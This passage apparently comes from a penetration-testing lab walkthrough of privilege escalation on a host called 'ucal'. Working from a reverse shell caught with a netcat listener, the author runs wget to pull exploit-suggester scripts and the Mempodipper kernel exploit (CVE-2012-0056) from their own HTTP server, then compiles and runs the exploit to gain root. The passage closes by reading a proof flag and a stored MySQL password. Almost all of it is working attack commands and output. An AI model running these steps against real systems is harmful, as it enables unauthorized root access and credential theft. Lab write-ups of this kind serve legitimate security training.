[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
www-data@ucal:/tmp$ gcc
gcc
gcc: fatal error: no input files
compilation terminated.
www-data@ucal:/tmp$ wget 192.168.49.140/les2.pl
wget 192.168.49.140/les2.pl
--2022-02-20 17:02:39--  http://192.168.49.140/les2.pl
Connecting to 192.168.49.140:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24292 (24K) [text/x-perl]
Saving to: `les2.pl'

100%[======================================>] 24,292       133K/s   in 0.2s    

2022-02-20 17:02:40 (133 KB/s) - `les2.pl' saved [24292/24292]

www-data@ucal:/tmp$ chmod +x les2.pl
chmod +x les2.pl
www-data@ucal:/tmp$ ./les2.pl
./les2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 3.0.0
  Searching 72 exploits...

  Possible Exploits
  [1] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] memodipper
      CVE-2012-0056
      Source: http://www.exploit-db.com/exploits/18411
  [4] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [5] perf_swevent
      CVE-2013-2094
      Source: http://www.exploit-db.com/exploits/26131
  [6] semtex
      CVE-2013-2094
      Source: http://www.exploit-db.com/exploits/25444

www-data@ucal:/tmp$ ps aux | grep root
ps aux | grep root
root         1  0.0  0.4  24020  2120 ?        Ss   16:28   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    16:28   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    16:28   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    16:28   0:00 [kworker/u:0]
root         6  0.0  0.0      0     0 ?        S    16:28   0:00 [migration/0]
root         7  0.0  0.0      0     0 ?        S<   16:28   0:00 [cpuset]
root         8  0.0  0.0      0     0 ?        S<   16:28   0:00 [khelper]
root         9  0.0  0.0      0     0 ?        S<   16:28   0:00 [netns]
root        10  0.0  0.0      0     0 ?        S    16:28   0:00 [sync_supers]
root        11  0.0  0.0      0     0 ?        S    16:28   0:00 [bdi-default]
root        12  0.0  0.0      0     0 ?        S<   16:28   0:00 [kintegrityd]
root        13  0.0  0.0      0     0 ?        S<   16:28   0:00 [kblockd]
root        14  0.0  0.0      0     0 ?        S<   16:28   0:00 [ata_sff]
root        15  0.0  0.0      0     0 ?        S    16:28   0:00 [khubd]
root        16  0.0  0.0      0     0 ?        S<   16:28   0:00 [md]
root        18  0.0  0.0      0     0 ?        S    16:28   0:00 [kworker/u:1]
root        19  0.0  0.0      0     0 ?        R    16:28   0:00 [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    16:28   0:00 [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    16:28   0:00 [kswapd0]
root        22  0.0  0.0      0     0 ?        SN   16:28   0:00 [ksmd]
root        23  0.0  0.0      0     0 ?        S    16:28   0:00 [fsnotify_mark]
root        24  0.0  0.0      0     0 ?        S    16:28   0:00 [ecryptfs-kthrea]
root        25  0.0  0.0      0     0 ?        S<   16:28   0:00 [crypto]
root        33  0.0  0.0      0     0 ?        S<   16:28   0:00 [kthrotld]
root        34  0.0  0.0      0     0 ?        S    16:28   0:00 [scsi_eh_0]
root        35  0.0  0.0      0     0 ?        S    16:28   0:00 [scsi_eh_1]
root        56  0.0  0.0      0     0 ?        S    16:28   0:00 [kworker/0:2]
root       183  0.0  0.0      0     0 ?        S<   16:28   0:00 [mpt_poll_0]
root       185  0.0  0.0      0     0 ?        S<   16:28   0:00 [mpt/0]
root       218  0.0  0.0      0     0 ?        S    16:28   0:00 [scsi_eh_2]
root       230  0.0  0.0      0     0 ?        S<   16:28   0:00 [kdmflush]
root       239  0.0  0.0      0     0 ?        S<   16:28   0:00 [kdmflush]
root       253  0.0  0.0      0     0 ?        S    16:28   0:00 [jbd2/dm-0-8]
root       254  0.0  0.0      0     0 ?        S<   16:28   0:00 [ext4-dio-unwrit]
root       312  0.0  0.1  17112   632 ?        S    16:28   0:00 upstart-udev-bridge --daemon
root       317  0.0  0.2  21464  1304 ?        Ss   16:28   0:00 udevd --daemon
root       390  0.0  0.1  21348   884 ?        S    16:28   0:00 udevd --daemon
root       391  0.0  0.1  21412   804 ?        S    16:28   0:00 udevd --daemon
root       445  0.0  0.0      0     0 ?        S<   16:28   0:00 [kpsmoused]
root       482  0.0  0.0      0     0 ?        S<   16:28   0:00 [vmmemctl]
root       510  0.0  0.0  15064   388 ?        S    16:28   0:00 upstart-socket-bridge --daemon
root       630  0.0  0.0      0     0 ?        S    16:28   0:00 [flush-252:0]
root       681  0.0  0.1   4196   632 tty4     Ss+  16:30   0:00 /sbin/getty -8 38400 tty4
root       686  0.0  0.1   4196   632 tty5     Ss+  16:30   0:00 /sbin/getty -8 38400 tty5
root       690  0.0  0.1   4196   632 tty2     Ss+  16:30   0:00 /sbin/getty -8 38400 tty2
root       691  0.0  0.1   4196   632 tty3     Ss+  16:30   0:00 /sbin/getty -8 38400 tty3
root       696  0.0  0.1   4196   636 tty6     Ss+  16:30   0:00 /sbin/getty -8 38400 tty6
root       713  0.0  0.2  18992  1020 ?        Ss   16:30   0:00 cron
root       908  0.0  0.3  24956  1644 ?        Ss   16:30   0:00 /usr/lib/postfix/master
root       960  0.0  0.1  24088   616 ?        Ss   16:30   0:00 pure-ftpd (SERVER)                                                                                                          
root      1113  0.0  1.8 153668  9128 ?        Ss   16:30   0:00 /usr/sbin/apache2 -k start
root      1143  0.0  0.1   4196   632 tty1     Ss+  16:30   0:00 /sbin/getty -8 38400 tty1
root      1146  0.0  0.9 103604  4968 ?        Sl   16:30   0:01 /usr/sbin/vmtoolsd
root      1423  0.0  0.5  49700  2760 ?        Ss   16:33   0:00 /usr/sbin/sshd -D
root      4379  0.0  0.0      0     0 ?        S    17:01   0:00 [flush-8:0]
www-data 25607  0.0  0.1   6384   596 pts/0    S+   17:02   0:00 grep root
www-data@ucal:/tmp$ 
```

## Kernel Exploit

```bash
┌──(kali㉿kali)-[/tmp]
└─$ wget https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c                             
--2022-02-20 12:20:17--  https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
Resolving git.zx2c4.com (git.zx2c4.com)... 147.75.77.251, 2604:1380:1:4d00::3
Connecting to git.zx2c4.com (git.zx2c4.com)|147.75.77.251|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7093 (6.9K) [text/plain]
Saving to: ‘mempodipper.c’

mempodipper.c                             100%[=====================================================================================>]   6.93K  --.-KB/s    in 0s      

2022-02-20 12:20:19 (201 MB/s) - ‘mempodipper.c’ saved [7093/7093]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                                                                  1 ⨯
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.140.37 - - [20/Feb/2022 12:01:15] "GET /lse.sh HTTP/1.0" 200 -
192.168.140.37 - - [20/Feb/2022 12:02:38] "GET /les2.pl HTTP/1.0" 200 -
192.168.140.37 - - [20/Feb/2022 12:04:47] "GET /40839.c HTTP/1.0" 200 -
192.168.140.37 - - [20/Feb/2022 12:12:06] "GET /40616.c HTTP/1.0" 200 -
192.168.140.37 - - [20/Feb/2022 12:14:03] "GET /18411.c HTTP/1.0" 200 -
192.168.140.37 - - [20/Feb/2022 12:15:14] "GET /26131.c HTTP/1.0" 200 -
^[[A192.168.140.37 - - [20/Feb/2022 12:19:36] "GET /les.sh HTTP/1.0" 200 -
192.168.140.37 - - [20/Feb/2022 12:20:38] "GET /mempodipper.c HTTP/1.0" 200 -
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 4444                                                                                     
listening on [any] 4444 ...
connect to [192.168.49.140] from (UNKNOWN) [192.168.140.37] 53846
www-data@ucal:/var/www/webcalendar/includes$ cd /tmp
cd /tmp
www-data@ucal:/tmp$ wget 192.168.49.140/les.sh
wget 192.168.49.140/les.sh
--2022-02-20 17:19:37--  http://192.168.49.140/les.sh
Connecting to 192.168.49.140:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 88891 (87K) [text/x-sh]
Saving to: `les.sh'

100%[======================================>] 88,891       244K/s   in 0.4s    

2022-02-20 17:19:38 (244 KB/s) - `les.sh' saved [88891/88891]

www-data@ucal:/tmp$ chmod +x les.sh
chmod +x les.sh
www-data@ucal:/tmp$ ./les.sh 
./les.sh

Available information:

Kernel version: 3.0.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 11.10
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

78 kernel space exploits
48 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2012-0056] memodipper

   Details: https://git.zx2c4.com/CVE-2012-0056/about/
   Exposure: highly probable
   Tags: [ ubuntu=(10.04|11.10){kernel:3.0.0-12-(generic|server)} ]
   Download URL: https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2016-6663,CVE-2016-6664|CVE-2016-6662] mysql-exploit-chain

   Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
   Exposure: less probable
   Tags: ubuntu=16.04.1
   Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
   Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
   Download URL: https://www.exploit-db.com/download/26131
   Comments: No SMEP/SMAP bypass

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c
   Comments: No SMEP/SMAP bypass

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/27297

www-data@ucal:/tmp$ wget 192.168.49.140/mempodipper.c
wget 192.168.49.140/mempodipper.c
--2022-02-20 17:20:40--  http://192.168.49.140/mempodipper.c
Connecting to 192.168.49.140:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7093 (6.9K) [text/x-csrc]
Saving to: `mempodipper.c'

100%[======================================>] 7,093       --.-K/s   in 0s      

2022-02-20 17:20:40 (274 MB/s) - `mempodipper.c' saved [7093/7093]

www-data@ucal:/tmp$ gcc mempodipper.c -o mempodipper
gcc mempodipper.c -o mempodipper
www-data@ucal:/tmp$ ./mempodipper
./mempodipper
===============================
=          Mempodipper        =
=           by zx2c4          =
=         Jan 21, 2012        =
===============================

[+] Ptracing su to find next instruction without reading binary.
[+] Creating ptrace pipe.
[+] Forking ptrace child.
[+] Waiting for ptraced child to give output on syscalls.
[+] Ptrace_traceme'ing process.
[+] Error message written. Single stepping to find address.
[+] Resolved call address to 0x401ce8.
[+] Opening socketpair.
[+] Waiting for transferred fd in parent.
[+] Executing child from child fork.
[+] Opening parent mem /proc/4015/mem in child.
[+] Sending fd 7 to parent.
[+] Received fd at 7.
[+] Assigning fd 7 to stderr.
[+] Calculating su padding.
[+] Seeking to offset 0x401cdc.
[+] Executing su with shellcode.
# cd /root
cd /root
# cat proof.txt
cat proof.txt
710e3d45b1b0d8c98409dafcd14661e4
# /sbin/ifconfig
/sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:ba:fc:40  
          inet addr:192.168.140.37  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feba:fc40/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1747 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1555 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:374779 (374.7 KB)  TX bytes:766891 (766.8 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:50 errors:0 dropped:0 overruns:0 frame:0
          TX packets:50 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:5381 (5.3 KB)  TX bytes:5381 (5.3 KB)

#
# cat mysqlpwd
cat mysqlpwd
k4WyggnoM9QUGkeP
```

![](Pasted%20image%2020220221012350.png)

# Other